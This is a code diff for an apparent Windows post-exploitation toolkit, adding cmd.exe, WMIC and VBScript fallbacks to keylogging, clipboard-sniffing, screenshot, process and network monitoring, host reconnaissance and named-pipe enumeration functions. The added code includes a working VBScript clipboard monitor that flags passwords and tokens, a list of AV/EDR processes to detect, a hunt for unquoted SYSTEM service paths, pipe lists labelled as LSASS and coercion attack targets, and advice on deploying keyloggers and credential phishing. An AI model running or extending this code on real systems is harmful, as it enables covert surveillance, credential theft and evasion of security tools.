@@ -1,10 +1,20 @@
-import { ps, argVal, hasFlag } from "./shared"
+import { ps, cmd, wmic, vbs, activeExec, argVal, hasFlag } from "./shared"
 import type { Finding, HookResult } from "./shared"
 
 export async function keylogWin(args: string[], timeout: number): Promise<HookResult> {
   const duration = parseInt(argVal(args, "--duration") || "30")
   const findings: Finding[] = []
   const output: string[] = [`[*] Starting Windows keylogger for ${duration}s...\n`]
+
+  if (activeExec === "cmd" || activeExec === "bat" || activeExec === "wmic") {
+    output.push("[!] Keylogging requires Win32 API (GetAsyncKeyState) — not available via cmd.exe")
+    output.push("[*] Alternatives:")
+    output.push("    1. Use --exec ps (PowerShell with Add-Type P/Invoke)")
+    output.push("    2. Use --exec vbs (VBScript with SendKeys monitoring — limited)")
+    output.push("    3. Deploy a compiled keylogger binary and use winhook process_inject")
+    output.push("    4. Use winhook credential_prompt for targeted credential phishing")
+    return { output: output.join("\n"), findings }
+  }
 
   const script = `
 Add-Type -TypeDefinition @'
@@ -68,6 +78,37 @@ export async function etwProcess(args: string[], timeout: number): Promise<HookR
   const findings: Finding[] = []
   const output: string[] = [`[*] Monitoring process creation for ${duration}s...\n`]
 
+  if (activeExec === "cmd" || activeExec === "bat") {
+    const baseline = await cmd("tasklist /v /fo csv", timeout)
+    output.push(`[*] Baseline snapshot captured (cmd.exe tasklist)`)
+    const baselineLines = new Set(baseline.stdout.trim().split("\n").map((l) => l.split(",")[0]))
+    await new Promise((r) => setTimeout(r, Math.min(duration, 15) * 1000))
+    const current = await cmd("tasklist /v /fo csv", timeout)
+    const currentLines = current.stdout.trim().split("\n")
+    const newProcs = currentLines.filter((l) => !baselineLines.has(l.split(",")[0]))
+    output.push(`[+] New processes detected: ${newProcs.length}`)
+    output.push("    PID | Name | Session | Memory | Status | User | Window")
+    output.push("    " + "-".repeat(70))
+    for (const line of newProcs.slice(0, 50)) {
+      output.push(`    ${line}`)
+    }
+    findings.push({ checkId: "WIN-ETW-PROC-001", provider: "windows", severity: "info", status: "CAPTURED", resource: "windows://cmd/tasklist", title: `Process diff: ${newProcs.length} new processes in ${duration}s`, details: `cmd.exe tasklist polling — baseline vs current snapshot`, remediation: "Review for security tool executions" })
+    return { output: output.join("\n"), findings }
+  }
+
+  if (activeExec === "wmic") {
+    const baseline = await wmic("process get ProcessId,ParentProcessId,Name,CommandLine /format:csv", timeout)
+    output.push("[*] Baseline snapshot captured (wmic)")
+    const baselinePids = new Set(baseline.stdout.trim().split("\n").map((l) => l.split(",")[1]))
+    await new Promise((r) => setTimeout(r, Math.min(duration, 15) * 1000))
+    const current = await wmic("process get ProcessId,ParentProcessId,Name,CommandLine /format:csv", timeout)
+    const newProcs = current.stdout.trim().split("\n").filter((l) => !baselinePids.has(l.split(",")[1]))
+    output.push(`[+] New processes (wmic): ${newProcs.length}`)
+    for (const line of newProcs.slice(0, 50)) output.push(`    ${line}`)
+    findings.push({ checkId: "WIN-ETW-PROC-001", provider: "windows", severity: "info", status: "CAPTURED", resource: "windows://wmic/process", title: `Process diff: ${newProcs.length} new processes in ${duration}s`, details: `wmic process polling — baseline vs current`, remediation: "Review for security tool executions" })
+    return { output: output.join("\n"), findings }
+  }
+
   const script = `
 $events = @()
 $watcher = Register-WmiEvent -Query "SELECT * FROM Win32_ProcessStartTrace" -Action {
@@ -116,6 +157,56 @@ export async function etwNetwork(args: string[], timeout: number): Promise<HookR
   const duration = parseInt(argVal(args, "--duration") || "30")
   const findings: Finding[] = []
   const output: string[] = [`[*] Monitoring network connections for ${duration}s...\n`]
+
+  if (activeExec === "cmd" || activeExec === "bat") {
+    const baseline = await cmd("netstat -ano", timeout)
+    if (baseline.exitCode === 0) {
+      const lines = baseline.stdout.trim().split("\n").filter((l) => l.includes("ESTABLISHED") || l.includes("LISTENING"))
+      const established = lines.filter((l) => l.includes("ESTABLISHED"))
+      const listening = lines.filter((l) => l.includes("LISTENING"))
+      output.push(`[+] Active TCP connections (cmd.exe netstat):`)
+      output.push(`[+] Established: ${established.length}`)
+      for (const l of established.slice(0, 50)) output.push(`    ${l.trim()}`)
+      output.push(`\n[+] Listening: ${listening.length}`)
+      for (const l of listening.slice(0, 30)) output.push(`    ${l.trim()}`)
+    }
+    if (duration > 0) {
+      output.push(`\n[*] Polling for new connections over ${Math.min(duration, 15)}s...`)
+      await new Promise((r) => setTimeout(r, Math.min(duration, 15) * 1000))
+      const after = await cmd("netstat -ano", timeout)
+      if (after.exitCode === 0) output.push("[+] Post-monitoring netstat snapshot captured")
+    }
+    output.push("\n[*] Additional cmd.exe network recon:")
+    const arp = await cmd("arp -a", timeout)
+    if (arp.exitCode === 0) {
+      output.push("\n=== ARP Table ===")
+      output.push(arp.stdout.trim().split("\n").slice(0, 30).join("\n"))
+    }
+    const dns = await cmd("ipconfig /displaydns", timeout)
+    if (dns.exitCode === 0) {
+      const dnsEntries = dns.stdout.match(/Record Name.*: .+/g) || []
+      output.push(`\n=== DNS Cache (${dnsEntries.length} entries) ===`)
+      for (const e of dnsEntries.slice(0, 20)) output.push(`    ${e.trim()}`)
+    }
+    const shares = await cmd("net share", timeout)
+    if (shares.exitCode === 0) {
+      output.push("\n=== Network Shares ===")
+      output.push(shares.stdout.trim())
+    }
+    findings.push({ checkId: "WIN-NET-001", provider: "windows", severity: "info", status: "CAPTURED", resource: "windows://cmd/netstat", title: "Network connections via cmd.exe netstat", details: `TCP connection monitoring over ${duration}s with ARP/DNS/shares`, remediation: "Review for C2, lateral movement, or data exfiltration channels" })
+    return { output: output.join("\n"), findings }
+  }
+
+  if (activeExec === "wmic") {
+    const r = await wmic("nicconfig where IPEnabled=true get IPAddress,MACAddress,DefaultIPGateway,DNSServerSearchOrder /format:list", timeout)
+    output.push("=== Network Interfaces (wmic) ===")
+    output.push(r.stdout.trim())
+    const netstat = await cmd("netstat -ano", timeout)
+    output.push("\n=== Active Connections (netstat) ===")
+    output.push(netstat.stdout.trim().split("\n").slice(0, 50).join("\n"))
+    findings.push({ checkId: "WIN-NET-001", provider: "windows", severity: "info", status: "CAPTURED", resource: "windows://wmic/network", title: "Network enumeration via wmic + netstat", details: "Interface config via wmic, connections via netstat", remediation: "Review for C2 channels" })
+    return { output: output.join("\n"), findings }
+  }
 
   const baseline = await ps(
     "Get-NetTCPConnection | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess | ConvertTo-Json",
@@ -169,6 +260,48 @@ export async function clipboardSniff(args: string[], timeout: number): Promise<H
   const findings: Finding[] = []
   const output: string[] = [`[*] Monitoring clipboard for ${duration}s (interval: ${interval}s)...\n`]
 
+  if (activeExec === "vbs" || activeExec === "mshta") {
+    const vbsScript = `
+Dim oHTML : Set oHTML = CreateObject("htmlfile")
+Dim last : last = ""
+Dim endTime : endTime = DateAdd("s", ${duration}, Now)
+Do While Now < endTime
+  Dim clip : clip = oHTML.parentWindow.clipboardData.getData("text")
+  If clip <> "" And clip <> last Then
+    WScript.Echo Now & "|" & clip
+    last = clip
+  End If
+  WScript.Sleep ${interval * 1000}
+Loop
+Set oHTML = Nothing
+`
+    const r = await vbs(vbsScript, Math.max(timeout, duration + 10))
+    if (r.stdout.trim()) {
+      const entries = r.stdout.trim().split("\n").filter(Boolean)
+      output.push(`[+] Clipboard changes captured (VBScript): ${entries.length}`)
+      for (const entry of entries) {
+        const content = entry.substring(entry.indexOf("|") + 1).substring(0, 200)
+        const sensitive = /password|token|key|secret|bearer|api[_-]?key|authorization/i.test(content)
+        output.push(`    ${sensitive ? "[!!! SENSITIVE] " : ""}${content}`)
+        if (sensitive) findings.push({ checkId: `WIN-CLIP-${findings.length + 1}`, provider: "windows", severity: "critical", status: "CAPTURED", resource: "windows://clipboard", title: "Sensitive data from clipboard (VBScript)", details: `Content matches sensitive patterns`, remediation: "Rotate any credentials that were copied" })
+      }
+    }
+    if (!r.stdout.trim()) output.push("[*] No clipboard changes detected (VBScript monitor)")
+    return { output: output.join("\n"), findings }
+  }
+
+  if (activeExec === "cmd" || activeExec === "bat" || activeExec === "wmic") {
+    output.push("[!] Clipboard monitoring requires PowerShell or VBScript")
+    output.push("[*] cmd.exe has no native clipboard read capability")
+    output.push("[*] Workaround: Use --exec vbs for VBScript-based clipboard capture")
+    output.push("[*] Alternative: powershell -c Get-Clipboard (if PS accessible but restricted)")
+    const clipOnce = await cmd("powershell.exe -NoProfile -Command Get-Clipboard 2>nul", timeout)
+    if (clipOnce.exitCode === 0 && clipOnce.stdout.trim()) {
+      output.push(`\n[+] Current clipboard content (one-shot via PS): ${clipOnce.stdout.trim().substring(0, 200)}`)
+    }
+    return { output: output.join("\n"), findings }
+  }
+
   const script = `
 $captured = @()
 $end = (Get-Date).AddSeconds(${duration})
@@ -220,6 +353,23 @@ export async function screenshotGrab(args: string[], timeout: number): Promise<H
   const outputPath = argVal(args, "--output") || `${process.env.TEMP || "C:\\Windows\\Temp"}\\cs-capture-${Date.now()}`
   const findings: Finding[] = []
   const output: string[] = ["[*] Visual capture operations...\n"]
+
+  if (activeExec === "cmd" || activeExec === "bat" || activeExec === "wmic") {
+    output.push("[!] Screenshot capture requires GDI+ (.NET) — not available via cmd.exe")
+    output.push("[*] Alternatives:")
+    output.push("    1. Use --exec ps (PowerShell with System.Drawing)")
+    output.push('    2. Use nircmd.exe: nircmd savescreenshot "screenshot.png"')
+    output.push("    3. Use Snippingtool.exe /clip (Windows 10+)")
+    output.push("    4. Use mshta with HTML5 Canvas (limited, no multi-monitor)")
+    if (action === "webcam" || action === "all") {
+      const devicesCmd = await cmd("wmic path Win32_PnPEntity where \"PNPClass='Camera' or PNPClass='Image'\" get Name,Status /format:list", timeout)
+      if (devicesCmd.exitCode === 0 && devicesCmd.stdout.trim()) {
+        output.push("\n=== Webcam Devices (wmic) ===")
+        output.push(devicesCmd.stdout.trim())
+      }
+    }
+    return { output: output.join("\n"), findings }
+  }
 
   if (action === "screen" || action === "all") {
     const script = `
@@ -371,6 +521,131 @@ export async function localRecon(args: string[], timeout: number): Promise<HookR
   const action = argVal(args, "--action") || "full"
   const findings: Finding[] = []
   const output: string[] = ["[*] Local environment reconnaissance...\n"]
+
+  if (activeExec === "cmd" || activeExec === "bat" || activeExec === "wmic") {
+    if (action === "av" || action === "full") {
+      output.push("=== AV/EDR Detection (cmd.exe) ===\n")
+      const tl = await cmd("tasklist /svc /fo csv", timeout)
+      const avProcs = [
+        { proc: "MsMpEng", name: "Windows Defender", type: "AV", risk: "MEDIUM" },
+        { proc: "MsSense", name: "Defender for Endpoint (EDR)", type: "EDR", risk: "HIGH" },
+        { proc: "CSFalconService", name: "CrowdStrike Falcon", type: "EDR", risk: "CRITICAL" },
+        { proc: "SentinelAgent", name: "SentinelOne", type: "EDR", risk: "CRITICAL" },
+        { proc: "CbDefense", name: "Carbon Black", type: "EDR", risk: "HIGH" },
+        { proc: "SophosMcsAgent", name: "Sophos Central", type: "EDR", risk: "HIGH" },
+        { proc: "CylanceSvc", name: "Cylance", type: "AI-AV", risk: "HIGH" },
+        { proc: "TmListen", name: "Trend Micro", type: "EDR", risk: "HIGH" },
+        { proc: "ekrn", name: "ESET NOD32", type: "AV", risk: "MEDIUM" },
+        { proc: "mfetp", name: "McAfee/Trellix", type: "EDR", risk: "HIGH" },
+        { proc: "ccSvcHst", name: "Symantec/Broadcom", type: "AV", risk: "MEDIUM" },
+        { proc: "CortexXDR", name: "Palo Alto Cortex XDR", type: "EDR", risk: "CRITICAL" },
+        { proc: "splunkd", name: "Splunk Forwarder", type: "SIEM", risk: "MEDIUM" },
+        { proc: "winlogbeat", name: "Elastic Winlogbeat", type: "SIEM", risk: "MEDIUM" },
+      ]
+      const detected = avProcs.filter((av) => tl.stdout.includes(av.proc))
+      if (detected.length > 0) {
+        output.push(`[!] DETECTED SECURITY PRODUCTS (${detected.length}):`)
+        for (const d of detected) output.push(`    [${d.risk}] ${d.name} (${d.type})`)
+      }
+      if (detected.length === 0) output.push("[+] No known AV/EDR products detected in tasklist")
+      const scDefender = await cmd("sc query WinDefend", timeout)
+      if (scDefender.stdout.includes("RUNNING")) output.push("[*] Windows Defender service: RUNNING")
+      const fwStatus = await cmd("netsh advfirewall show allprofiles state", timeout)
+      if (fwStatus.exitCode === 0) {
+        output.push("\n=== Firewall Profiles ===")
+        output.push(fwStatus.stdout.trim())
+      }
+      findings.push({ checkId: "WIN-RECON-001", provider: "windows", severity: "info", status: "ENUMERATED", resource: "host://av-edr", title: "AV/EDR detection via cmd.exe tasklist + sc", details: `${detected.length} security products detected`, remediation: "Ensure EDR agents are tamper-protected." })
+    }
+
+    if (action === "software" || action === "full") {
+      output.push("\n=== Installed Software (cmd.exe) ===")
+      const reg = await cmd('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" /s /v DisplayName 2>nul', timeout)
+      const names = (reg.stdout.match(/DisplayName\s+REG_SZ\s+(.+)/g) || []).map((m) => m.replace(/DisplayName\s+REG_SZ\s+/, "").trim())
+      output.push(`[*] Installed applications: ${names.length}`)
+      const interesting = ["Python", "Git", "Visual Studio", "Node", "Java", "Docker", "VPN", "Remote", "TeamViewer", "AnyDesk", "PuTTY", "WinSCP", "KeePass", "OpenSSH", "Chrome", "Firefox", "Wireshark", "Nmap"]
+      const found = names.filter((n) => interesting.some((i) => n.toLowerCase().includes(i.toLowerCase())))
+      if (found.length > 0) {
+        output.push("[!] Interesting software:")
+        for (const f of found) output.push(`    ${f}`)
+      }
+      const ver = await cmd("powershell.exe -NoProfile -Command $PSVersionTable.PSVersion.ToString() 2>nul || echo N/A", timeout)
+      output.push(`[*] PowerShell version: ${ver.stdout.trim() || "N/A"}`)
+      findings.push({ checkId: "WIN-RECON-002", provider: "windows", severity: "info", status: "ENUMERATED", resource: "host://software", title: "Software inventory via registry query", details: `${names.length} apps found, ${found.length} interesting`, remediation: "Remove unnecessary software." })
+    }
+
+    if (action === "services" || action === "full") {
+      output.push("\n=== Running Services (cmd.exe) ===")
+      if (activeExec === "wmic") {
+        const svc = await wmic("service where state='Running' get Name,DisplayName,StartName,PathName /format:csv", timeout)
+        output.push(svc.stdout.trim().split("\n").slice(0, 40).join("\n"))
+        const unquoted = svc.stdout.split("\n").filter((l) => {
+          const parts = l.split(",")
+          const path = parts[3] || ""
+          return path && !path.startsWith('"') && path.includes(" ") && (parts[2] || "").includes("LocalSystem")
+        })
+        if (unquoted.length > 0) {
+          output.push(`\n[!] Unquoted service paths running as SYSTEM: ${unquoted.length}`)
+          for (const u of unquoted) output.push(`    ${u}`)
+        }
+      } else {
+        const sc = await cmd("sc query state= all", timeout)
+        const running = (sc.stdout.match(/SERVICE_NAME: .+/g) || []).length
+        output.push(`[*] Total services queried`)
+        const netStart = await cmd("net start", timeout)
+        output.push(netStart.stdout.trim().split("\n").slice(0, 30).join("\n"))
+      }
+      findings.push({ checkId: "WIN-RECON-003", provider: "windows", severity: "info", status: "ENUMERATED", resource: "host://services", title: "Service enumeration via cmd.exe", details: "sc query / wmic service / net start", remediation: "Quote all service binary paths." })
+    }
+
+    if (action === "network" || action === "full") {
+      output.push("\n=== Network (cmd.exe) ===")
+      const ipconfig = await cmd("ipconfig /all", timeout)
+      output.push(ipconfig.stdout.trim().split("\n").slice(0, 30).join("\n"))
+      const netstat = await cmd("netstat -ano", timeout)
+      const established = netstat.stdout.split("\n").filter((l) => l.includes("ESTABLISHED"))
+      const listening = netstat.stdout.split("\n").filter((l) => l.includes("LISTENING"))
+      output.push(`\n[+] Established connections: ${established.length}`)
+      for (const l of established.slice(0, 20)) output.push(`    ${l.trim()}`)
+      output.push(`\n[+] Listening ports: ${listening.length}`)
+      for (const l of listening.slice(0, 20)) output.push(`    ${l.trim()}`)
+      const arp = await cmd("arp -a", timeout)
+      output.push("\n=== ARP Table ===")
+      output.push(arp.stdout.trim().split("\n").slice(0, 15).join("\n"))
+      const route = await cmd("route print", timeout)
+      output.push("\n=== Routing Table ===")
+      output.push(route.stdout.trim().split("\n").slice(0, 15).join("\n"))
+      const shares = await cmd("net share", timeout)
+      output.push("\n=== Shares ===")
+      output.push(shares.stdout.trim())
+      findings.push({ checkId: "WIN-RECON-004", provider: "windows", severity: "info", status: "ENUMERATED", resource: "host://network", title: "Network recon via cmd.exe native commands", details: "ipconfig, netstat, arp, route, net share", remediation: "Close unnecessary ports." })
+    }
+
+    if (action === "hotfixes" || action === "full") {
+      output.push("\n=== Hotfixes & OS Info (cmd.exe) ===")
+      if (activeExec === "wmic") {
+        const qfe = await wmic("qfe list brief /format:csv", timeout)
+        const lines = qfe.stdout.trim().split("\n").filter(Boolean)
+        output.push(`[*] Hotfixes installed: ${lines.length - 1}`)
+        for (const l of lines.slice(0, 15)) output.push(`    ${l}`)
+        const os = await wmic("os get Caption,Version,BuildNumber,OSArchitecture,LastBootUpTime /format:list", timeout)
+        output.push("\n=== OS Info ===")
+        output.push(os.stdout.trim())
+      } else {
+        const sysinfo = await cmd("systeminfo", timeout)
+        const hotfixes = (sysinfo.stdout.match(/KB\d+/g) || [])
+        output.push(`[*] Hotfixes found: ${hotfixes.length}`)
+        for (const kb of hotfixes.slice(0, 15)) output.push(`    ${kb}`)
+        const osLine = sysinfo.stdout.split("\n").find((l) => l.includes("OS Name"))
+        if (osLine) output.push(`\n[*] ${osLine.trim()}`)
+        const buildLine = sysinfo.stdout.split("\n").find((l) => l.includes("OS Version"))
+        if (buildLine) output.push(`[*] ${buildLine.trim()}`)
+      }
+      findings.push({ checkId: "WIN-RECON-005", provider: "windows", severity: "info", status: "ENUMERATED", resource: "host://hotfixes", title: "Patch level assessment via cmd.exe", details: "systeminfo or wmic qfe", remediation: "Keep systems patched." })
+    }
+
+    return { output: output.join("\n"), findings }
+  }
 
   if (action === "av" || action === "full") {
     const script = `
@@ -713,6 +988,50 @@ export async function pipeEnum(args: string[], timeout: number): Promise<HookRes
   const filter = argVal(args, "--filter")
   const findings: Finding[] = []
   const output: string[] = ["[*] Named pipe enumeration...\n"]
+
+  if (activeExec === "cmd" || activeExec === "bat") {
+    const dirPipes = await cmd('dir \\\\.\\pipe\\ /b', timeout)
+    if (dirPipes.exitCode === 0) {
+      const pipes = dirPipes.stdout.trim().split("\n").filter(Boolean)
+      output.push(`[*] Total named pipes: ${pipes.length} (cmd.exe dir)`)
+      const securityPipes = [
+        { pattern: "lsass", desc: "LSASS — credential extraction target", risk: "HIGH" },
+        { pattern: "spoolss", desc: "Print Spooler — PrinterBug coercion", risk: "HIGH" },
+        { pattern: "efsrpc", desc: "EFS RPC — PetitPotam coercion", risk: "HIGH" },
+        { pattern: "netlogon", desc: "Netlogon — Zerologon target", risk: "HIGH" },
+        { pattern: "samr", desc: "SAM Remote — user enumeration", risk: "MEDIUM" },
+        { pattern: "svcctl", desc: "Service Control Manager", risk: "MEDIUM" },
+        { pattern: "atsvc", desc: "Task Scheduler — remote task creation", risk: "MEDIUM" },
+        { pattern: "winreg", desc: "Remote Registry", risk: "MEDIUM" },
+        { pattern: "FssagentRpc", desc: "File Server VSS — ShadowCoerce", risk: "HIGH" },
+        { pattern: "SQLLocal", desc: "SQL Server local pipe", risk: "MEDIUM" },
+        { pattern: "dnsserver", desc: "DNS Server — DnsAdmin abuse", risk: "HIGH" },
+      ]
+      output.push("\n[!] Security-relevant pipes:")
+      for (const sp of securityPipes) {
+        const matched = pipes.filter((p) => p.toLowerCase().includes(sp.pattern.toLowerCase()))
+        for (const m of matched) output.push(`    [${sp.risk}] ${m}\n         ${sp.desc}`)
+      }
+      if (action === "custom") {
+        const systemPipes = ["lsass", "ntsvcs", "scerpc", "spoolss", "efsrpc", "netlogon", "samr", "srvsvc", "svcctl", "wkssvc", "winreg", "browser", "eventlog", "InitShutdown", "LSM_API", "ROUTER", "W32TIME", "Winsock2", "atsvc", "trkwks", "TSVCPIPE", "TermSrv"]
+        const custom = pipes.filter((p) => !systemPipes.some((sp) => p.toLowerCase().includes(sp.toLowerCase())))
+        output.push(`\n=== Custom/Non-Standard Pipes (${custom.length}) ===`)
+        for (const c of custom.slice(0, 50)) output.push(`    ${c}`)
+        output.push("\n[*] Look for: C2 framework pipes (msagent_, MSSE-, postex_, beacon)")
+      }
+      if (filter) {
+        const filtered = pipes.filter((p) => p.toLowerCase().includes(filter.toLowerCase()))
+        output.push(`\n=== Filtered (${filter}): ${filtered.length} ===`)
+        for (const f of filtered) output.push(`    ${f}`)
+      }
+      findings.push({ checkId: "WIN-RECON-010", provider: "windows", severity: "info", status: "ENUMERATED", resource: "host://named-pipes", title: "Named pipe enumeration via cmd.exe dir", details: `${pipes.length} pipes found`, remediation: "Restrict pipe ACLs." })
+    }
+    if (action === "acl") {
+      output.push("\n[!] Pipe ACL analysis requires PowerShell/.NET — use --exec ps")
+      output.push("[*] Basic pipe connectivity can be tested with: echo test > \\\\.\\pipe\\PIPENAME")
+    }
+    return { output: output.join("\n"), findings }
+  }
 
   if (action === "enum" || action === "full") {
     const script = `
